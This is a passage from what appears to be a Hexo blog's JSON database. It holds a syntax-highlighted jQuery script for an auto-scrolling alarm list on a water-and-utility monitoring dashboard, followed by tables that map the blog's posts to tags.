class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> wrnList = [</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">1</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"3\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"pressure过高\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:34:05\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区1\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">2</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"4\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"tds过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:44\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区2\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">3</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"4\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"tds过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:44\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区3\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">4</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"4\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"tds过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:44\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区4\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">5</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"3\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"pressure过高\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 13:04:05\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区5\"</span>&#125;,</span><br><span class=\"line\">\t&#123; <span class=\"string\">\"id\"</span>: <span class=\"number\">6</span>, <span class=\"string\">\"deviceType\"</span>: <span class=\"string\">\"3\"</span>, <span class=\"string\">\"content\"</span>: <span class=\"string\">\"pressure过低\"</span>, <span class=\"string\">\"createTime\"</span>: <span class=\"string\">\"2020-10-20 12:34:05\"</span>, <span class=\"string\">\"areaName\"</span>: <span class=\"string\">\"某某区6\"</span>&#125;];</span><br><span class=\"line\"><span class=\"keyword\">var</span> timer = <span class=\"number\">0</span>;</span><br><span class=\"line\">mouseLeave();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 翻滚</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">autoScroll</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> dom = $(<span class=\"string\">\"#wrnList\"</span>);</span><br><span class=\"line\">\tdom.css(<span class=\"string\">'margin-top'</span>, <span class=\"string\">'-56px'</span>);</span><br><span class=\"line\">\tdom.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第三行变第二行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child3 = $(<span class=\"string\">\".child_3\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// child3.removeClass('child_3');</span></span><br><span class=\"line\">\t<span class=\"comment\">// child3.addClass('child_2');</span></span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'padding'</span>, <span class=\"string\">'0 40px'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'0.6'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'height'</span>, <span class=\"string\">'46px'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'width'</span>, <span class=\"string\">'calc(302px - 80px)'</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'background-image'</span>, <span class=\"string\">\"url('./img/wrn/small.png')\"</span>);</span><br><span class=\"line\">\tchild3.css(<span class=\"string\">'background-size'</span>, <span class=\"string\">'302px auto'</span>);</span><br><span class=\"line\">\tchild3.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第四行变第三行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child4 = $(<span class=\"string\">\".child_4\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// child4.removeClass('child_4');</span></span><br><span class=\"line\">\t<span class=\"comment\">// child4.addClass('child_3');</span></span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'padding'</span>, <span class=\"string\">'0 50px'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'1'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'height'</span>, <span class=\"string\">'58px'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'width'</span>, <span class=\"string\">'calc(416px - 100px)'</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'background-image'</span>, <span class=\"string\">\"url('./img/wrn/big.png')\"</span>);</span><br><span class=\"line\">\tchild4.css(<span class=\"string\">'background-size'</span>, <span class=\"string\">'416px auto'</span>);</span><br><span class=\"line\">\tchild4.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第五行变第四行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child5 = $(<span class=\"string\">\".child_5\"</span>);</span><br><span class=\"line\">\tchild5.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'0.6'</span>);</span><br><span class=\"line\">\tchild5.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// 第二行变第一行</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child2 = $(<span class=\"string\">\".child_2\"</span>);</span><br><span class=\"line\">\tchild2.css(<span class=\"string\">'opacity'</span>, <span class=\"string\">'0.3'</span>);</span><br><span class=\"line\">\tchild2.addClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> that = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\tthat.wrnList.push(that.wrnList[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\tthat.wrnList.shift();</span><br><span class=\"line\">\t\tthat.insertWrn();</span><br><span class=\"line\">\t\tdom.css(<span class=\"string\">'margin-top'</span>, <span class=\"string\">'0px'</span>);</span><br><span class=\"line\">\t\tdom.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild3.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild4.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild5.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t\tchild2.removeClass(<span class=\"string\">'anim'</span>);</span><br><span class=\"line\">\t&#125;, <span class=\"number\">400</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 插数据方法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insertWrn</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> hl = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> wrnType = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i <span class=\"keyword\">in</span> wrnList) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i &gt; <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">4</span> || wrnList[i].deviceType == <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'用水报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">2</span> || wrnList[i].deviceType == <span class=\"number\">3</span> || wrnList[i].deviceType == <span class=\"number\">7</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'管网报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'用电报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (wrnList[i].deviceType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'空气报警'</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\twrnType = <span class=\"string\">'未知报警'</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\thl += <span class=\"string\">`&lt;div class=\"wrnItem child_<span class=\"subst\">$&#123;<span class=\"built_in\">parseInt</span>(i) + <span class=\"number\">1</span>&#125;</span>\"&gt;&lt;div class=\"wrnItemTime\"&gt;<span class=\"subst\">$&#123;wrnList[i].areaName&#125;</span> <span class=\"subst\">$&#123;wrnList[i].content&#125;</span> <span class=\"subst\">$&#123;wrnType&#125;</span> <span class=\"subst\">$&#123;wrnList[i].createTime&#125;</span>&lt;/div&gt;&lt;/div&gt;`</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$(<span class=\"string\">\"#wrnList\"</span>).html(hl);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 告警列表点击事件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">clickList</span>(<span class=\"params\">event</span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> itemId = wrnList[<span class=\"number\">2</span>].id;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> e = event || <span class=\"built_in\">window</span>.event;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> winWidth = <span class=\"built_in\">window</span>.innerWidth;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"winWidth\", winWidth);</span></span><br><span class=\"line\">\t<span class=\"keyword\">let</span> x = e.clientX;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> y = e.clientY;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"x\", x);</span></span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"y\", y);</span></span><br><span class=\"line\">\t<span class=\"keyword\">let</span> right_margin = winWidth - x;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> top_margin = y;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"right_margin\",right_margin);</span></span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"top_margin\",top_margin);</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (top_margin &lt;= <span class=\"number\">285</span> &amp;&amp; top_margin &gt;= <span class=\"number\">256</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (right_margin &gt;= <span class=\"number\">153</span> &amp;&amp; right_margin &lt;= <span class=\"number\">223</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// console.log(\"发起工单\");</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// addWorkOrder(itemId);</span></span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"发起工单\"</span> + itemId);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (right_margin &gt; <span class=\"number\">223</span> &amp;&amp; right_margin &lt;= <span class=\"number\">394</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// console.log(\"忽略\");</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// ignoreWarning(itemId);</span></span><br><span class=\"line\">\t\t\talert(<span class=\"string\">\"误报\"</span> + itemId);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"i\", i);</span></span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"itemId\", itemId);</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 鼠标移入</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mouseEnter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// console.log(\"mouseEnter\");</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (timer != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tclearInterval(timer);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> child = $(<span class=\"string\">\".child_3\"</span>);</span><br><span class=\"line\">\tchild.css(<span class=\"string\">'padding-bottom'</span>, <span class=\"string\">'34px'</span>);</span><br><span class=\"line\">\tchild.css(<span class=\"string\">'background-image'</span>, <span class=\"string\">\"url('./img/wrn/big_on.png')\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 鼠标离开</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mouseLeave</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\tinsertWrn();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (wrnList.length &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">\t\ttimer = setInterval(autoScroll, <span class=\"number\">1800</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>原理自己探索吧，项目需求有些特别，所以有的地方比较定制化，自己用的话可能要做不少修改。</li>\n</ul>"}],"PostAsset":[{"_id":"source/_posts/newpost-19/cat.png","slug":"cat.png","post":"ckrlq5rcz000jq0szn8zbqdaz","modified":1,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"ckrlq5rch0000q0szubahhx8z","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rcy000fq0szp9sdiyyl"},{"post_id":"ckrlq5rch0000q0szubahhx8z","tag_id":"ckrlq5rct000aq0szlbbwdb1x","_id":"ckrlq5rcz000hq0szrsovwr2r"},{"post_id":"ckrlq5rcv000cq0sz9gb0cc9x","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rd0000kq0szx2bffouc"},{"post_id":"ckrlq5rcm0002q0szxu11k314","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rd1000mq0szteg5scae"},{"post_id":"ckrlq5rcy000gq0szeugj62i5","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rd2000pq0szrg0o4hos"},{"post_id":"ckrlq5rd1000oq0szdsm86mcl","tag_id":"ckrlq5rd1000nq0sz546hxedx","_id":"ckrlq5rd3000rq0sze0qlt4cj"},{"post_id":"ckrlq5rcp0005q0sz5p3xmwlr","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rd4000uq0szsk7rtwy8"},{"post_id":"ckrlq5rcp0005q0sz5p3xmwlr","tag_id":"ckrlq5rd1000nq0sz546hxedx","_id":"ckrlq5rd5000wq0szsm5g1bqj"},{"post_id":"ckrlq5rcr0007q0szvaxcx5af","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rd90012q0szdktbxy4b"},{"post_id":"ckrlq5rcr0007q0szvaxcx5af","tag_id":"ckrlq5rd5000xq0szjr237dgq","_id":"ckrlq5rda0014q0sz9shqcwqq"},{"post_id":"ckrlq5rd90013q0sz651sq994","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdb0017q0szgs78yecc"},{"post_id":"ckrlq5rd90013q0sz651sq994","tag_id":"ckrlq5rd5000xq0szjr237dgq","_id":"ckrlq5rdc0019q0sz2z4xhabb"},{"post_id":"ckrlq5rdb0018q0sz551ddo2c","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdd001cq0sz1ai68zxu"},{"post_id":"ckrlq5rdb0018q0sz551ddo2c","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rde001eq0sz9tz30y7u"},{"post_id":"ckrlq5rct0009q0szdw4nirzs","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdf001hq0szb5owjicv"},{"post_id":"ckrlq5rct0009q0szdw4nirzs","tag_id":"ckrlq5rda0016q0sz1a2w0xtr","_id":"ckrlq5rdg001jq0szo8b8t3mc"},{"post_id":"ckrlq5rdd001dq0szhnkb1ja5","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdh001mq0szpq6ahr4v"},{"post_id":"ckrlq5rcu000bq0szycdl1p85","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdi001oq0szyo23tc24"},{"post_id":"ckrlq5rcu000bq0szycdl1p85","tag_id":"ckrlq5rda0016q0sz1a2w0xtr","_id":"ckrlq5rdj001rq0sznu6x00m5"},{"post_id":"ckrlq5rdh001nq0szene0oupm","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdj001tq0szcv3zl7uf"},{"post_id":"ckrlq5rdi001pq0szzkos144l","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdl001wq0sz0t8edkkc"},{"post_id":"ckrlq5rcx000eq0szindfro04","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdm001yq0szobmacp0a"},{"post_id":"ckrlq5rcx000eq0szindfro04","tag_id":"ckrlq5rdi001qq0szmzaqol3i","_id":"ckrlq5rdn0021q0szhmromx8m"},{"post_id":"ckrlq5rdl001xq0szbvexmupf","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdo0023q0sz71ll21es"},{"post_id":"ckrlq5rcz000jq0szn8zbqdaz","tag_id":"ckrlq5rdk001vq0szsc2fx1oy","_id":"ckrlq5rdp0026q0sz0rlkqv6y"},{"post_id":"ckrlq5rdn0022q0sz4h8iy2le","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdq0028q0szw7877thq"},{"post_id":"ckrlq5rd0000lq0szptxq91wv","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5rdr002bq0sz3i50mzqb"},{"post_id":"ckrlq5rd0000lq0szptxq91wv","tag_id":"ckrlq5rda0016q0sz1a2w0xtr","_id":"ckrlq5rds002dq0szbb01w15s"},{"post_id":"ckrlq5rdp0027q0sz0pfenr8q","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdt002gq0szdxfurdhz"},{"post_id":"ckrlq5rdp0027q0sz0pfenr8q","tag_id":"ckrlq5rd5000xq0szjr237dgq","_id":"ckrlq5rdu002iq0sz3o31go7p"},{"post_id":"ckrlq5rd2000qq0sz9g7wgbc7","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdu002kq0sze6itow8f"},{"post_id":"ckrlq5rd2000qq0sz9g7wgbc7","tag_id":"ckrlq5rdi001qq0szmzaqol3i","_id":"ckrlq5rdw002nq0szu30k18n5"},{"post_id":"ckrlq5rdq0029q0szjtoomnyg","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdx002pq0sztlrw6rr1"},{"post_id":"ckrlq5rdq0029q0szjtoomnyg","tag_id":"ckrlq5rd1000nq0sz546hxedx","_id":"ckrlq5rdy002sq0szsgmf44p5"},{"post_id":"ckrlq5rd3000tq0szbcxjsadg","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rdz002uq0szn70jkopw"},{"post_id":"ckrlq5rd3000tq0szbcxjsadg","tag_id":"ckrlq5rd5000xq0szjr237dgq","_id":"ckrlq5re0002xq0szk6fqynnz"},{"post_id":"ckrlq5rd4000vq0szyezti5p8","tag_id":"ckrlq5rdt002fq0sztiwlnefr","_id":"ckrlq5re0002zq0szr87ko2oj"},{"post_id":"ckrlq5rd4000vq0szyezti5p8","tag_id":"ckrlq5rd1000nq0sz546hxedx","_id":"ckrlq5re20032q0sz11fzks86"},{"post_id":"ckrlq5rdv002lq0sz1pi0pfog","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5re20034q0szpwqt263r"},{"post_id":"ckrlq5rdw002oq0sz3euybwdm","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re40037q0szwka51lo0"},{"post_id":"ckrlq5rd6000yq0szn9dxvvhp","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5re40038q0szfwnfeasb"},{"post_id":"ckrlq5rd6000yq0szn9dxvvhp","tag_id":"ckrlq5rdi001qq0szmzaqol3i","_id":"ckrlq5re4003aq0szlbt5ync7"},{"post_id":"ckrlq5rdx002qq0szi1zuylaw","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re4003bq0szijskexws"},{"post_id":"ckrlq5rd7000zq0sz5u4jm77i","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5re5003dq0sz096owuex"},{"post_id":"ckrlq5rd7000zq0sz5u4jm77i","tag_id":"ckrlq5rda0016q0sz1a2w0xtr","_id":"ckrlq5re5003eq0sz1rdhx53x"},{"post_id":"ckrlq5rdz002vq0sz9le4lzsx","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re5003gq0szjdzrsph3"},{"post_id":"ckrlq5rdz002vq0sz9le4lzsx","tag_id":"ckrlq5rct000aq0szlbbwdb1x","_id":"ckrlq5re6003hq0szhpusysnq"},{"post_id":"ckrlq5re0002yq0szbb2k2tcx","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re6003jq0szaqiytyqw"},{"post_id":"ckrlq5re0002yq0szbb2k2tcx","tag_id":"ckrlq5rct000aq0szlbbwdb1x","_id":"ckrlq5re6003kq0szlkxf95pj"},{"post_id":"ckrlq5rd70010q0szy8gnrz13","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re7003lq0szls7yare6"},{"post_id":"ckrlq5rd70010q0szy8gnrz13","tag_id":"ckrlq5rdz002wq0szj1l6kzac","_id":"ckrlq5re7003nq0sz6qdgkrme"},{"post_id":"ckrlq5re10030q0sz5ww4wadn","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re7003oq0szbts3of1g"},{"post_id":"ckrlq5re10030q0sz5ww4wadn","tag_id":"ckrlq5rct000aq0szlbbwdb1x","_id":"ckrlq5re8003qq0sz2vwac5k4"},{"post_id":"ckrlq5re20033q0szbpmy2ybw","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re8003rq0sz87btvv15"},{"post_id":"ckrlq5rda0015q0szp1csxtmn","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5re8003tq0szqh12akyb"},{"post_id":"ckrlq5rda0015q0szp1csxtmn","tag_id":"ckrlq5rdz002wq0szj1l6kzac","_id":"ckrlq5re8003uq0szf2wfyw0r"},{"post_id":"ckrlq5re30035q0szrwko06fi","tag_id":"ckrlq5rd1000nq0sz546hxedx","_id":"ckrlq5re9003wq0sz8dcl3yfr"},{"post_id":"ckrlq5rdc001aq0sz9reyqp8n","tag_id":"ckrlq5re30036q0szrp9vv6am","_id":"ckrlq5re9003xq0szufl3ssmk"},{"post_id":"ckrlq5rdc001aq0sz9reyqp8n","tag_id":"ckrlq5re40039q0szhn02oepz","_id":"ckrlq5re9003zq0szbmhla3mw"},{"post_id":"ckrlq5rde001fq0szytew9ut8","tag_id":"ckrlq5re30036q0szrp9vv6am","_id":"ckrlq5rea0040q0szezff9bce"},{"post_id":"ckrlq5rde001fq0szytew9ut8","tag_id":"ckrlq5re40039q0szhn02oepz","_id":"ckrlq5rea0042q0szrleqooc3"},{"post_id":"ckrlq5rdf001iq0szv8yyyjf4","tag_id":"ckrlq5rco0004q0szejyub8vv","_id":"ckrlq5reb0043q0szx1z0b7vs"},{"post_id":"ckrlq5rdf001iq0szv8yyyjf4","tag_id":"ckrlq5re6003iq0szom93qwhm","_id":"ckrlq5reb0045q0szsxfmgaha"},{"post_id":"ckrlq5rdg001kq0sz9qaclstx","tag_id":"ckrlq5re6003iq0szom93qwhm","_id":"ckrlq5reb0046q0szpsui9eq0"},{"post_id":"ckrlq5rdj001sq0szt4u72ykq","tag_id":"ckrlq5re6003iq0szom93qwhm","_id":"ckrlq5rec0048q0sznhhqvlbp"},{"post_id":"ckrlq5rdk001uq0szy7xvtw0m","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5rec0049q0sz53b2plgn"},{"post_id":"ckrlq5rdk001uq0szy7xvtw0m","tag_id":"ckrlq5re8003sq0szi4j7k26k","_id":"ckrlq5rec004bq0sz7zfqseze"},{"post_id":"ckrlq5rdm001zq0szgd8thve1","tag_id":"ckrlq5re9003vq0szsb1hknfm","_id":"ckrlq5red004cq0szqe23w0lg"},{"post_id":"ckrlq5rdo0024q0szgemf3bym","tag_id":"ckrlq5re6003iq0szom93qwhm","_id":"ckrlq5red004eq0szrn6i6o1g"},{"post_id":"ckrlq5rdr002cq0sziljc3xeq","tag_id":"ckrlq5re9003vq0szsb1hknfm","_id":"ckrlq5red004fq0sz6yhmta1u"},{"post_id":"ckrlq5rds002eq0sziripf8n8","tag_id":"ckrlq5re9003vq0szsb1hknfm","_id":"ckrlq5red004gq0sz52mjb1wh"},{"post_id":"ckrlq5rdt002hq0szlvuhsvqn","tag_id":"ckrlq5re9003vq0szsb1hknfm","_id":"ckrlq5ree004hq0szw1vi9clt"},{"post_id":"ckrlq5rdu002jq0sz5l9ebw6h","tag_id":"ckrlq5rec004aq0sz1zo59kgo","_id":"ckrlq5ree004iq0szv1bwjpff"},{"post_id":"ckrlq5rdu002jq0sz5l9ebw6h","tag_id":"ckrlq5rcz000iq0szjk6h9ddz","_id":"ckrlq5ree004jq0szp87ryj7r"},{"post_id":"ckrlq5rdy002tq0szgfksgyue","tag_id":"ckrlq5red004dq0sz467tq6xy","_id":"ckrlq5ree004kq0sz78e67uzg"}],"Tag":[{"name":"运维","_id":"ckrlq5rco0004q0szejyub8vv"},{"name":"持续集成","_id":"ckrlq5rct000aq0szlbbwdb1x"},{"name":"编程","_id":"ckrlq5rcz000iq0szjk6h9ddz"},{"name":"前端","_id":"ckrlq5rd1000nq0sz546hxedx"},{"name":"Java","_id":"ckrlq5rd5000xq0szjr237dgq"},{"name":"Python","_id":"ckrlq5rda0016q0sz1a2w0xtr"},{"name":"MySQL","_id":"ckrlq5rdi001qq0szmzaqol3i"},{"name":"测试","_id":"ckrlq5rdk001vq0szsc2fx1oy"},{"name":"JavaScript","_id":"ckrlq5rdt002fq0sztiwlnefr"},{"name":"Nginx","_id":"ckrlq5rdz002wq0szj1l6kzac"},{"name":"分享","_id":"ckrlq5re30036q0szrp9vv6am"},{"name":"汉